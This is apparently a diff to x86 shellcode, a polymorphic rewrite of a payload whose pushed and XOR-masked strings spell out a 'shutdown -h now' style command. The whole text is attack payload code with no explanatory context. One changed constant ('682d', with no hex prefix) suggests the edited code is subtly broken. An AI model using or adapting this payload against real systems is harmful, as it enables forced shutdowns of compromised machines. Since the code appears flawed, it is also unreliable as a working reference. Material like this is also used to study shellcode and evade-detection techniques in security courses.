@@ -1,18 +1,18 @@
 global _start
 section .text
 _start:
-xor eax, eax
-xor edx, edx
+xor ecx, ecx
+mul ecx
 push eax
 
 ; pushed h-
-push word 0x682c
-xor [esp], byte 0x1
+push word 682d
+mov esi, esp
 push eax
-
 ;pushed won
 push byte 0x77
 push word 0x6f6e
+mov edi, esp
 push eax
 
 ;pushed nwod
@@ -33,7 +33,10 @@ xor byte [esp], 0x22
 push   0x6940732f
 xor byte [esp+2], 0x22
 mov ebx, esp
+
 push eax
+push esi
+push edi
 push ebx
 mov ecx,esp 
 mov al,8
